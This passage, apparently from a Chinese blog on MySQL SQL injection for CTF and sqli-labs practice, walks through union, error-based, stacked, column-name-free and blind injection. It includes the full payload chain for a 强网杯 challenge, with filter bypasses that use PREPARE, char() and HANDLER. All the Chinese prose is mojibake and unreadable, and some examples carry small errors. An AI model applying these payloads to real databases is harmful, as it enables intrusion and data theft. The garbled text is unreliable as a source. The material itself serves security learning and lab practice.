desc;#æŸ¥çœ‹æ‰€æœ‰æ­£åœ¨è¿æ¥çš„ç”¨æˆ·è¯¦ç»†ä¿¡æ¯SELECT user,db,command,current_statement,last_statement,time FROM sys.session;#æŸ¥çœ‹æ‰€æœ‰æ›¾è¿æ¥æ•°æ®åº“çš„IP,æ€»è¿æ¥æ¬¡æ•°SELECT host,total_connections FROM sys.host_summary;</code></pre><p>åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨</p><pre class="language-none"><code class="language-none">SELECT QUERY FROM sys.x$statement_analysis WHERE QUERY REGEXP DATABASE();SELECT QUERY FROM `sys`.`statement_analysis` where QUERY REGEXP DATABASE();</code></pre><p>performance_schemaè¡¨</p><pre class="language-none"><code class="language-none">SELECT object_name FROM `performance_schema`.`objects_summary_global_by_type` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_handles` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_index_usage` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_io_waits_summary_by_table` WHERE object_schema = DATABASE();SELECT object_name FROM `performance_schema`.`table_lock_waits_summary_by_table` WHERE object_schema = DATABASE();</code></pre><p>åŒ…å«ä¹‹å‰æŸ¥è¯¢è®°å½•çš„è¡¨</p><pre class="language-none"><code class="language-none">SELECT digest_text FROM `performance_schema`.`events_statements_summary_by_digest` WHERE digest_text REGEXP DATABASE();</code></pre><p>åŒ…å«è¡¨æ–‡ä»¶è·¯å¾„çš„è¡¨</p><pre class="language-none"><code class="language-none">SELECT file_name FROM `performance_schema`.`file_instances` WHERE file_name REGEXP DATABASE();</code></pre><p>è¡¨æ ¼ è¿˜åœ¨åŠ è½½ä¸­ï¼Œè¯·ç­‰å¾…åŠ è½½å®Œæˆåå†å°è¯•å¤åˆ¶</p><p>ä¸Šè¯‰è¡¨æ ¼ä¸­è™½ç„¶æœ‰èƒ½å¤ŸæŸ¥åˆ—åçš„è¡¨ï¼Œä½†æ˜¯æŸ¥å‡ºæ¥çš„æ•°æ®éƒ½ä¸å…¨ï¼Œå½“çŸ¥é“<code>flag</code>æ‰€åœ¨çš„åº“å’Œè¡¨åæ—¶ï¼Œä½†æ— æ³•è·å–åˆ°åˆ—åï¼Œå°±éœ€è¦åˆ©ç”¨<strong>æ— åˆ—åç›²æ³¨äº†</strong></p><h2 id="selectè¢«è¿‡æ»¤"><a href="#selectè¢«è¿‡æ»¤" class="headerlink" title="selectè¢«è¿‡æ»¤"></a>selectè¢«è¿‡æ»¤</h2><pre class="language-none"><code class="language-none">mysql 8.0.19`æ–°å¢è¯­å¥`tableTABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</code></pre><p>å¯ä»¥æŠŠ<code>table t</code>ç®€å•ç†è§£æˆ<code>select * from t</code>ï¼Œå’Œ<code>select</code>çš„åŒºåˆ«åœ¨äº</p><ul><li><code>table</code>æ€»æ˜¯æ˜¾ç¤ºè¡¨çš„æ‰€æœ‰åˆ—</li><li><code>table</code>ä¸å…è®¸ä»»ä½•çš„è¡Œè¿‡æ»¤;ä¹Ÿå°±æ˜¯è¯´ï¼Œ<code>TABLE</code>ä¸æ”¯æŒä»»ä½•<code>WHERE</code>å­å¥ã€‚ å¯ä»¥ç”¨æ¥ç›²æ³¨è¡¨å</li></ul><pre class="language-none"><code class="language-none">admin'and\x0a(table\x0ainformation_schema.TABLESPACES_EXTENSIONS\x0alimit\x0a7,1)&gt;(BINARY('{}'),'0')#</code></pre><p>åŒæ—¶ä»£æ›¿<code>select</code>è¢«è¿‡æ»¤å¯¼è‡´åªèƒ½åŒè¡¨æŸ¥è¯¢çš„é—®é¢˜</p><p>PSï¼šæ–°å¢çš„<code>values</code>è¯­å¥ä¹ŸæŒºæœ‰æ„æ€ï¼Œåœ¨æŸäº›æƒ…å†µä¼¼ä¹å¯ä»¥ä»£æ›¿<code>union</code>æˆ–<code>select</code>è¿›è¡Œ<code>order by</code>ç›²æ³¨</p><h2 id="è”åˆæŸ¥è¯¢çš„ç±»å‹"><a href="#è”åˆæŸ¥è¯¢çš„ç±»å‹" class="headerlink" title="è”åˆæŸ¥è¯¢çš„ç±»å‹"></a>è”åˆæŸ¥è¯¢çš„ç±»å‹</h2><p>union è”åˆæ³¨å…¥ï¼Œunion çš„ä½œç”¨æ˜¯å°†ä¸¤ä¸ªsql è¯­å¥è¿›è¡Œè”åˆã€‚Union å¯ä»¥ä»ä¸‹é¢çš„ä¾‹å­ä¸­å¯ä»¥çœ‹å‡ºï¼Œå¼ºè°ƒä¸€ç‚¹ï¼šunion å‰åçš„ä¸¤ä¸ªsql è¯­å¥çš„é€‰æ‹©åˆ—æ•°è¦ç›¸åŒæ‰å¯ä»¥ã€‚Union all ä¸union çš„åŒºåˆ«æ˜¯å¢åŠ äº†å»é‡çš„åŠŸèƒ½ã€‚</p><p>å¹¶ä¸”è¿ç”¨information_schemaçš„çŸ¥è¯†ã€‚</p><p>sql-labs/less-1</p><p>å­—ç¬¦å‹æŠ¥é”™</p><pre class="language-none"><code class="language-none">//order byåˆ¤æ–­å­—æ®µhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' or 1=1 order by 3 --+//é€šè¿‡union selectåˆ¤æ–­æ˜¾ç¤ºçš„æ˜¯å“ªäº›å­—æ®µhttp://127.0.0.1/sqli-labs/Less-1/?id=-1' union select 1,2,3 --+//é€šè¿‡information_schemaçˆ†æ•°æ®åº“http://127.0.0.1/sqli-labs/Less-1/?id=-1'  union select 1,database(),group_concat(schema_name) from information_schema.schemata --+//çˆ†æ•°æ®è¡¨</code></pre><p>adminâ€™or(updatexml(1,concat(version()),1)orâ€™1â€™likeâ€™1</p><p>select(group_concat(table_name)from(infromation_schema.table)where(table_schema)like(â€˜geekâ€™))</p><p>select(group_concat(table_name)from(information_schema.tables)where(table_schema)like(â€˜geekâ€™))</p><p>sql-labs/less-2</p><p>æ•´æ•°æŠ¥é”™</p><p>ä¸less-1å·®ä¸å¤š å°†â€™å»é™¤å³å¯</p><p>sql-labs/less-3</p><p>å¯ä»¥æˆåŠŸæ³¨å…¥çš„æœ‰ï¼š</p><blockquote><p>â€˜) or â€˜1â€™=(â€˜1â€™ ) or 1=1 â€“+</p></blockquote><p>å°†less1 ä¸­çš„â€™ æ·»åŠ ï¼‰å³å¯ â€˜ï¼‰</p><p>sql-labs/less-4</p><p>å¯ä»¥æˆåŠŸæ³¨å…¥çš„æœ‰ï¼š</p><blockquote><p>â€œ) or â€1â€=(â€œ1 â€œ) or 1=1 â€“+</p></blockquote><p>å°†less1 ä¸­çš„â€˜ æ›´æ¢ä¸ºâ€œ)</p><p>sql-labs/less-5</p><h2 id="å †æŸ¥è¯¢æ³¨å°„"><a href="#å †æŸ¥è¯¢æ³¨å°„" class="headerlink" title="å †æŸ¥è¯¢æ³¨å°„"></a>å †æŸ¥è¯¢æ³¨å°„</h2><p>å †å æ³¨å…¥ã€‚ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯ä¸€å †sql è¯­å¥ï¼ˆå¤šæ¡ï¼‰ä¸€èµ·æ‰§è¡Œã€‚è€Œåœ¨çœŸå®çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„ï¼Œæˆ‘ä»¬çŸ¥é“åœ¨mysql ä¸­ï¼Œä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­ï¼Œæ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ ; è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åšstacked injectionã€‚</p><h3 id="åŸç†ä»‹ç»"><a href="#åŸç†ä»‹ç»" class="headerlink" title="åŸç†ä»‹ç»"></a>åŸç†ä»‹ç»</h3><p>åœ¨SQL ä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sql è¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunioninjectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunionæˆ–è€…union all æ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚</p><p>ä¾‹å¦‚ä»¥ä¸‹è¿™ä¸ªä¾‹å­ã€‚</p><p>å½“æ‰§è¡ŒæŸ¥è¯¢åï¼Œç¬¬ä¸€æ¡æ˜¾ç¤ºæŸ¥è¯¢ä¿¡æ¯ï¼Œç¬¬äºŒæ¡åˆ™å°†æ•´ä¸ªè¡¨è¿›è¡Œåˆ é™¤ã€‚</p><h3 id="å †å æ³¨å…¥çš„å±€é™æ€§"><a href="#å †å æ³¨å…¥çš„å±€é™æ€§" class="headerlink" title="å †å æ³¨å…¥çš„å±€é™æ€§"></a>å †å æ³¨å…¥çš„å±€é™æ€§</h3><p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚</p><p>è™½ç„¶æˆ‘ä»¬å‰é¢æåˆ°äº†å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œä»»æ„çš„sql è¯­å¥ï¼Œä½†æ˜¯è¿™ç§æ³¨å…¥æ–¹å¼å¹¶ä¸æ˜¯ååˆ†çš„å®Œç¾çš„ã€‚åœ¨æˆ‘ä»¬çš„web ç³»ç»Ÿä¸­ï¼Œå› ä¸ºä»£ç é€šå¸¸åªè¿”å›ä¸€ä¸ªæŸ¥è¯¢ç»“æœï¼Œå› æ­¤ï¼Œå †å æ³¨å…¥ç¬¬äºŒä¸ªè¯­å¥äº§ç”Ÿé”™è¯¯æˆ–è€…ç»“æœåªèƒ½è¢«å¿½ç•¥ï¼Œæˆ‘ä»¬åœ¨å‰ç«¯ç•Œé¢æ˜¯æ— æ³•çœ‹åˆ°è¿”å›ç»“æœçš„ã€‚å› æ­¤ï¼Œåœ¨è¯»å–æ•°æ®æ—¶ï¼Œæˆ‘ä»¬å»ºè®®ä½¿ç”¨unionï¼ˆè”åˆï¼‰æ³¨å…¥ã€‚åŒæ—¶åœ¨ä½¿ç”¨å †å æ³¨å…¥ä¹‹å‰ï¼Œæˆ‘ä»¬ä¹Ÿæ˜¯éœ€è¦çŸ¥é“ä¸€äº›æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„ï¼Œä¾‹å¦‚è¡¨åï¼Œåˆ—åç­‰ä¿¡æ¯ã€‚å¯è€ƒè™‘ä½¿ç”¨RENAMEå…³é”®å­—ï¼Œå°†æƒ³è¦çš„æ•°æ®åˆ—å/è¡¨åæ›´æ”¹æˆè¿”å›æ•°æ®çš„SQLè¯­å¥æ‰€å®šä¹‰çš„è¡¨/åˆ—åã€‚</p><pre class="language-none"><code class="language-none">ä»¥PHPä¸ºä¾‹ï¼Œä½¿ç”¨çš„æ¡ä»¶ä¸º$mysqli-&gt;multi_query($sql);</code></pre><p>ä½¿ç”¨å †å æ³¨å…¥æ—¶ï¼Œå¯ä½¿ç”¨çš„æ–¹æ³•ï¼š</p><p>å½“è¿‡æ»¤<code>select</code>æ—¶ï¼Œå¯ä½¿ç”¨<code>handler</code>è¯­å¥ã€‚<code>handler</code>è¯­å¥å¹¶ä¸å…·å¤‡<code>select</code>è¯­å¥çš„æ‰€æœ‰åŠŸèƒ½ã€‚å®ƒæ˜¯<code>mysql</code>ä¸“ç”¨çš„è¯­å¥ï¼Œå¹¶æ²¡æœ‰åŒ…å«åˆ°<code>SQL</code>æ ‡å‡†ä¸­</p><pre class="language-none"><code class="language-none">handler users open as hd; #æŒ‡å®šæ•°æ®è¡¨è¿›è¡Œè½½å…¥å¹¶å°†è¿”å›å¥æŸ„é‡å‘½åhandler hd read first; #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„é¦–è¡Œæ•°æ®handler hd read next; #è¯»å–æŒ‡å®šè¡¨/å¥æŸ„çš„ä¸‹ä¸€è¡Œæ•°æ®handler hd close; #å…³é—­å¥æŸ„</code></pre><p>é¢„å¤„ç†ï¼š</p><pre class="language-none"><code class="language-none">prepare xxx from "sqlè¯­å¥";execute xxx;ç”±äºsqlè¯­å¥æ˜¯å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨æ“ä½œå­—ç¬¦ä¸²çš„å‡½æ•°ï¼Œç»•è¿‡ä¸€äº›è¿‡æ»¤æ¯”å¦‚è¿‡æ»¤äº†selectPREPARE st from concat('s','elect', ' * from `1919810931114514`');EXECUTE st;#</code></pre><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><h4 id="å¼ºç½‘æ¯éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯éšä¾¿æ³¨" class="headerlink" title="å¼ºç½‘æ¯éšä¾¿æ³¨"></a>å¼ºç½‘æ¯éšä¾¿æ³¨</h4><pre class="language-none"><code class="language-none">1';show tables;#  çœ‹æœ‰ä»€ä¹ˆè¡¨åœ¨é‡Œé¢1';show columns from `1919810931114514`;#  çœ‹åˆ—1';show columns from `words`;# å¯ä»¥å‘ç°è¿™ä¸ªè¡¨æ˜¯å¯ä»¥å›æ˜¾å†…å®¹çš„æˆ‘ä»¬å¯ä»¥ç”¨å‡½æ•°å°†1919810931114514è¡¨æ”¹æˆwordsè¡¨ï¼Œæ¥è®©ä»–è‡ªåŠ¨å›æ˜¾RENAME TABLE `words` TO `words1`;RENAME TABLE `1919810931114514` TO `words`;ALTER TABLE `words` CHANGE `flag` `id` VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;#å°†æ–°wordsè¡¨çš„flagæ”¹ä¸ºidé¿å…å¼€å§‹æ— æ³•æŸ¥è¯¢æ¥ä¸‹æ¥è¿˜æœ‰é¢„å¤„ç†è¯­å¥ä½¿ç”¨æ–¹æ³•PREPARE name from '[my sql sequece]';   //é¢„å®šä¹‰SQLè¯­å¥EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE name;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥SET @tn = 'hahaha';  //å­˜å‚¨è¡¨åSET @sql = concat('select * from ', @tn);  //å­˜å‚¨SQLè¯­å¥PREPARE name from @sql;   //é¢„å®šä¹‰SQLè¯­å¥EXECUTE name;  //æ‰§è¡Œé¢„å®šä¹‰SQLè¯­å¥(DEALLOCATE || DROP) PREPARE sqla;  //åˆ é™¤é¢„å®šä¹‰SQLè¯­å¥ç”±äºè¿‡æ»¤äº†selectå¯ä»¥ç”¨chr()æœ€åpayload:æœ€ç»ˆpayload1';PREPARE jwt from concat(char(115,101,108,101,99,116), ' * from `1919810931114514` ');EXECUTE jwt;#1';HANDLER FlagHere OPEN;HANDLER FlagHere READ FIRST;HANDLER FlagHere CLOSE;#</code></pre><h2 id="æ— åˆ—åç›²æ³¨"><a href="#æ— åˆ—åç›²æ³¨" class="headerlink" title="æ— åˆ—åç›²æ³¨"></a>æ— åˆ—åç›²æ³¨</h2><p>å½“æˆ‘ä»¬æ— æ³•è·å–å­—æ®µæ—¶ï¼Œæ¯”å¦‚information_schemaè¢«è¿‡æ»¤ï¼Œå¯ä½¿ç”¨æ— åˆ—åæ³¨å…¥</p><h3 id="ä½¿ç”¨union-selecté‡å‘½åæ³•"><a href="#ä½¿ç”¨union-selecté‡å‘½åæ³•" class="headerlink" title="ä½¿ç”¨union selecté‡å‘½åæ³•"></a>ä½¿ç”¨<code>union selecté‡å‘½åæ³•</code></h3><pre class="language-none"><code class="language-none">mysql&gt; select * from users;+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+2 rows in set (0.00 sec)mysql&gt; select 1,2,3 union select * from users;+----+----------+------------+| 1  | 2        | 3          |+----+----------+------------+|  1 | 2        | 3          ||  1 | Dumb     | Dumb       ||  2 | Angelina | I-kill-you |+----+----------+------------+3 rows in set (0.00 sec)#å¯¹æ¯”å¯ä»¥å‘ç°ä½¿ç”¨unionæ—¶ï¼Œåˆ—åè¢«æ›¿æ¢ä¸ºå‰é¢çš„selectçš„åˆ—åäº†ï¼Œä¸º1ï¼Œ2ï¼Œ3ã€‚mysql&gt; select a.1 from (select 1,2,3 union select * from users) a;+---+| 1 |+---+| 1 || 1 || 2 |+---+3 rows in set (0.00 sec)#å°†å‰é¢ç”Ÿæˆçš„è¡¨é‡å‘½åä¸ºaï¼Œå†ä½¿ç”¨select a.1ï¼ŒæŸ¥è¯¢ç¬¬ä¸€åˆ—çš„å€¼#å¯ä»¥çœ‹åˆ°ï¼Œä½¿ç”¨unionæŸ¥è¯¢ï¼Œåœ¨ä¸çŸ¥é“åˆ—åçš„æƒ…å†µä¸‹ï¼Œä¾ç„¶èƒ½å¤Ÿå°†åˆ—æ³¨å…¥å‡ºæ¥ï¼Œé€šè¿‡1ï¼Œ2ï¼Œ3é€‰æ‹©ç¬¬å‡ åˆ—</code></pre><pre class="language-none"><code class="language-none">select c from (select 1 as a, 1 as b, 1 as c union select * from test)x limit 1 offset 1;select a.`3` from(select 1,2,3 union select * from admin)a limit 1,1;//æ— é€—å·ï¼Œæœ‰joinç‰ˆæœ¬select a from (select * from (select 1 `a`)m join (select 2 `b`)n join (select 3 `c`)t where 0 union select * from test)x;</code></pre><h3 id="æ¯”è¾ƒæ³•"><a href="#æ¯”è¾ƒæ³•" class="headerlink" title="æ¯”è¾ƒæ³•"></a>æ¯”è¾ƒæ³•</h3><pre class="language-none"><code class="language-none">mysql&gt; select 'b' &lt; 'azzzzz';+----------------+| 'b' &lt; 'azzzzz' |+----------------+|              0 |+----------------+1 row in set (0.00 sec)mysql&gt; select 'ab' &lt; 'azzzzz'    -&gt; ;+-----------------+| 'ab' &lt; 'azzzzz' |+-----------------+|               1 |+-----------------+1 row in set (0.00 sec)#mysqlæ¯”è¾ƒï¼Œä»ç¬¬ä¸€ä¸ªå­—ç¬¦è¿˜æ˜¯æ¯”è¾ƒasciiçš„å¤§å°ï¼Œä¸€æ¬¡å¾€å#å¹¶ä¸”å¤šåˆ—çš„æ¯”è¾ƒæ—¶ä»ç¬¬ä¸€åˆ—çš„ç¬¬ä¸€ä½å¼€å§‹çš„mysql&gt; select (select 1,'Dumb','a')&gt; (select * from users limit 1);+------------------------------------------------------+| (select 1,'Dumb','a')&gt; (select * from users limit 1) |+------------------------------------------------------+|                                                    0 |+------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','b') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','b') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     0 |+-------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','D') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','D') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     0 |+-------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; select (select 1,'Dumb','F') &gt; (select * from users limit 1);+-------------------------------------------------------+| (select 1,'Dumb','F') &gt; (select * from users limit 1) |+-------------------------------------------------------+|                                                     1 |+-------------------------------------------------------+1 row in set (0.00 sec)#é€šè¿‡æ¯”è¾ƒå¯ä»¥å°†ä¸‰åˆ—çš„æ•°æ®å…¨éƒ¨ç›²æ³¨å‡ºæ¥</code></pre><pre class="language-none"><code class="language-none">((SELECT 1,concat('{result+chr(mid)}', cast("0" as JSON)))&lt;(SELECT * FROM `f1ag_1s_h3r3_hhhhh`))</code></pre><p>è¦æ±‚åé¢selectçš„ç»“æœå¿…é¡»æ˜¯ä¸€è¡Œï¼Œå¯ä»¥é€šè¿‡limité™åˆ¶ä¸€è¡Œã€‚mysqlä¸­å¯¹charå‹å¤§å°å†™æ˜¯ä¸æ•æ„Ÿçš„ï¼Œç›²æ³¨çš„æ—¶å€™è¦ä¹ˆå¯ä»¥ä½¿ç”¨<code>hex</code>æˆ–è€…<code>binary</code>ã€‚</p><h2 id="SQL-ç›²æ³¨"><a href="#SQL-ç›²æ³¨" class="headerlink" title="SQL ç›²æ³¨"></a>SQL ç›²æ³¨</h2><p>ä½•ä¸ºç›²æ³¨ï¼Ÿç›²æ³¨å°±æ˜¯åœ¨sql æ³¨å…¥è¿‡ç¨‹ä¸­ï¼Œsql è¯­å¥æ‰§è¡Œçš„é€‰æ‹©åï¼Œé€‰æ‹©çš„æ•°æ®ä¸èƒ½å›æ˜¾åˆ°å‰ç«¯é¡µé¢ã€‚æ­¤æ—¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ©ç”¨ä¸€äº›æ–¹æ³•è¿›è¡Œåˆ¤æ–­æˆ–è€…å°è¯•ï¼Œè¿™ä¸ªè¿‡ç¨‹ç§°ä¹‹ä¸ºç›²æ³¨ã€‚</p><h3 id="åŸºäºå¸ƒå°”SQL-ç›²æ³¨"><a href="#åŸºäºå¸ƒå°”SQL-ç›²æ³¨" class="headerlink" title="åŸºäºå¸ƒå°”SQL ç›²æ³¨"></a>åŸºäºå¸ƒå°”SQL ç›²æ³¨</h3><h4 id="Sqlæ³¨å…¥æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°"><a href="#Sqlæ³¨å…¥æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°" class="headerlink" title="Sqlæ³¨å…¥æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°"></a>Sqlæ³¨å…¥æˆªå–å­—ç¬¦ä¸²å¸¸ç”¨å‡½æ•°</h4><p>åœ¨sqlæ³¨å…¥ä¸­ï¼Œå¾€å¾€ä¼šç”¨åˆ°æˆªå–å­—ç¬¦ä¸²çš„é—®é¢˜ï¼Œä¾‹å¦‚ä¸å›æ˜¾çš„æƒ…å†µä¸‹è¿›è¡Œçš„æ³¨å…¥ï¼Œä¹Ÿæˆä¸ºç›²æ³¨ï¼Œè¿™ç§æƒ…å†µä¸‹å¾€å¾€éœ€è¦ä¸€ä¸ªä¸€ä¸ªå­—ç¬¦çš„å»çŒœè§£ï¼Œè¿‡ç¨‹ä¸­éœ€è¦ç”¨åˆ°æˆªå–å­—ç¬¦ä¸²ã€‚</p><p><strong>mid()</strong></p><blockquote><p>mid(s,n,len);</p><p>ä»å­—ç¬¦ä¸² s çš„ n ä½ç½®æˆªå–é•¿åº¦ä¸º len çš„å­å­—ç¬¦ä¸²</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO</code></pre><p><strong>substr()/substring()</strong></p><blockquote><p>substr(s, start, length);</p><p>substring(s, start, length)</p><p>ä»å­—ç¬¦ä¸² s çš„ start ä½ç½®æˆªå–é•¿åº¦ä¸º length çš„å­å­—ç¬¦ä¸²</p></blockquote><pre class="language-none"><code class="language-none">SELECT MID("RUNOOB", 2, 3) AS ExtractString; -- UNO                                </code></pre><p><strong>left()</strong></p><blockquote><p>left(s,n);</p><p>è¿”å›å­—ç¬¦ä¸² s çš„å‰ n ä¸ªå­—ç¬¦</p></blockquote><pre class="language-none"><code class="language-none">SELECT LEFT('runoob',2);-- ru</code></pre><p><strong>right()</strong></p><blockquote><p>right(s,n);</p><p>è¿”å›å­—ç¬¦ä¸² s çš„å n ä¸ªå­—ç¬¦</p></blockquote><pre class="language-none"><code class="language-none">SELECT right('runoob',2);-- ob</code></pre><p><strong>ascii()/ord()</strong></p><blockquote><p>ascii(s);/ord(s);</p><p>è¿”å›å­—ç¬¦ä¸² s çš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ ASCII ç ã€‚</p><p>è¿™é‡Œä¸è€ƒè™‘å¤šå­—èŠ‚å­—ç¬¦ï¼Œæ¯”å¦‚æ±‰å­—</p></blockquote><p><strong>trim()/rtrim()/ltrim()</strong></p><blockquote><p>ltrim(s);</p><p>å»æ‰å­—ç¬¦ä¸²så¼€å§‹å¤„çš„ç©ºæ ¼</p><p>rtrim(s);</p><p>å»æ‰å­—ç¬¦ä¸²sç»“å°¾å¤„çš„ç©ºæ ¼</p><p>trim(s);</p><p>å»æ‰å­—ç¬¦ä¸²å¼€å§‹å’Œç»“å°¾å¤„çš„ç©ºæ ¼</p></blockquote><pre class="language-none"><code class="language-none">SELECT TRIM('    RUNOOB    ') AS TrimmedString;-- RUNOOBSELECT RTRIM("RUNOOB     ") AS RightTrimmedString;   -- RUNOOBSELECT LTRIM("    RUNOOB") AS LeftTrimmedString;-- RUNOOB</code></pre><p>è¿™ä¸ªæ€ä¹ˆç”¨æ¥æˆªå–å­—ç¬¦ä¸²å‘¢ï¼Ÿ</p><pre class="language-none"><code class="language-none">TRIM([BOTH/LEADING/TRAILING] ç›®æ ‡å­—ç¬¦ä¸² FROM æºå­—ç¬¦ä¸²ï¼‰BOTHåˆ é™¤ä¸¤è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸²LEADINGåˆ é™¤å·¦è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸²TARILINGåˆ é™¤å³è¾¹çš„æŒ‡å®šå­—ç¬¦ä¸²select trim(LEADING "a" from "abcd") = trim(LEADING "b" from "abcd");ä»¥è¿™ä¸ªä¸ºä¾‹ï¼Œæˆ‘ä»¬å°†åˆ é™¤çš„å­—ç¬¦ä¸²ASCIIå·®é™åˆ¶åœ¨1ï¼Œä¾‹å¦‚aå’Œbå½“è¿™ä¸ªç»“æœè¿”å›0æ—¶ï¼Œåˆ™ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯aæˆ–è€…bã€‚æ¥ç€è®©açš„ASCII+2å˜æˆcï¼Œå¦‚æœè¿”å›1ï¼Œåˆ™å­—ç¬¦ä¸²ç¬¬ä¸€ä½ä¸ºaï¼Œåä¹‹ç¬¬ä¸€ä½ä¸ºbã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä¸ºäº†æ–¹ä¾¿å†™è„šæœ¬ç¬¬äºŒä¸ªå­—ç¬¦åˆ¤æ–­select trim(LEADING "aa" from "abcd") = trim(LEADING "ab" from "abcd");æ¥ç€é‡å¤ä¸Šé¢çš„è¿‡ç¨‹ï¼Œåˆ¤æ–­ç¬¬äºŒä¸ªå­—ç¬¦ä»¥æ­¤æ¨å‡ºæ•´ä¸ªå­—ç¬¦ä¸²å¦‚æœ=ç”¨regexpæ›¿ä»£é‚£ä¹ˆæ­£ç¡®çš„å­—ç¬¦ä¸€å®šåœ¨regexpå‰é¢ä»¥è¿™ä¸ªabcdä¸ºä¾‹Trim(leading â€˜aâ€™ from â€˜abcdâ€™) regexp trim(LEADING â€˜xâ€™ from â€˜abcdâ€™)å°±æ˜¯bcd regexp abcdè¿”å›0ï¼Œ å¦‚æœåè¿‡æ¥å°±æ˜¯abcd regexp bcd è¿”å›1å› æ­¤åªéœ€åˆ¤æ–­ç¬¬ä¸€æ­¥å³å¯ï¼Œè€Œä¸éœ€è¦ASCII+2å»åˆ¤æ–­äº†æ³¨ï¼šy1ngå¸ˆå‚…åœ¨[HFCTF 2021 Final]hatenumä¸­ç”¨åˆ°äº†è¿™ä¸ªæ–¹æ³•ï¼Œé€šè¿‡æŒç»­é€’å½’ï¼Œå¤šæ¬¡å¥—å¨ƒtrimã€‚å¦‚æœå­—ç¬¦ä¸²é•¿åº¦è¢«é™åˆ¶ï¼Œå¯ä½¿ç”¨ã€‚ä¸€æ¬¡åªæˆªæ–­å‡ ä¸ªå­—ç¬¦ä¾‹å¦‚ï¼šselect trim(LEADING "b" from trim(LEADING "a" from "abcd"));-- cdå…ˆæˆªæ–­aï¼Œè¿”å›å­—ç¬¦ä¸²bcdï¼Œåœ¨æˆªæ–­bï¼Œè¿”å›å­—ç¬¦ä¸²cd</code></pre><p><strong>æ³¨ï¼šå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‡½æ•°å¯ä»¥ä¸ä½¿ç”¨</strong>**,<strong><strong>çš„ï¼Œå¦‚æœ</strong></strong>,**<strong>è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨</strong></p><p><strong>INSERT()</strong></p><blockquote><p>INSERT(s1,x,len,s2)</p><p>å­—ç¬¦ä¸² s2 æ›¿æ¢ s1 çš„ x 